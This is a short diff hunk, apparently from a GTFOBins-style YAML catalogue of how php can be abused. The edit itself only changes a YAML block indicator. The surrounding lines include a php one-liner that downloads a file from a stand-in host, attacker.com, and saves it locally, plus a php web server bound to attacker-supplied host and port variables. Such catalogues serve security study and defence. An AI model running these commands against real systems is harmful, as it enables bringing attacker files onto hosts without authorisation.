@@ -35,7 +35,7 @@ functions:
         php -S $LHOST:$LPORT
   download:
     - description: Fetch a remote file via HTTP GET request.
-      code: |-
+      code: |
         export URL=http://attacker.com/file_to_get
         export LFILE=where_to_save
         php -r '$c=file_get_contents(getenv("URL"));file_put_contents(getenv("LFILE"), $c);'
